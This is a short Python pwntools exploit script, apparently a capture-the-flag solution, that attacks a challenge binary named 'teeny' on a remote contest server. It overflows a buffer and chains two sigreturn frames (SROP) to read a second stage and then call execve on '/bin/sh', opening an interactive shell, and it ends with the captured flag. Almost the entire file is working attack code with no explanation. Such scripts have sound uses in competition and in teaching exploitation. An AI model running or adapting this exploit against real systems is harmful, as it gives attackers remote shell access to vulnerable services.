from pwn import *

#context.log_level = "DEBUG"

elf = context.binary = ELF("./teeny", checksec=False)
#p = process("./teeny")
p = remote("cybergon2023.webhop.me", 5004)

#https://github.com/ElikBelik77/ctfs-writeups/tree/master/offshift/moving_signals
pop_rax = 0x40018
start_offset = 0x40000
syscall_ret = 0x40015

payload = b"A" * 8
payload += p64(pop_rax)
payload += p64(15)
payload += p64(syscall_ret)

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = 0x40025
frame.rdx = 0x300
frame.rsp = 0x40025
frame.rip = syscall_ret
payload += bytes(frame)
p.send(payload)

payload = p64(pop_rax) + p64(15) + p64(syscall_ret)
frame = SigreturnFrame()
frame.rax = 59
frame.rdi = 0x40025 + 248 + 0x18
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0x40000
frame.rip = syscall_ret
payload += bytes(frame) + b"/bin/sh\x00"
p.send(payload)

p.interactive()
#CybergonCTF{5UD0_R0P_ch41n}
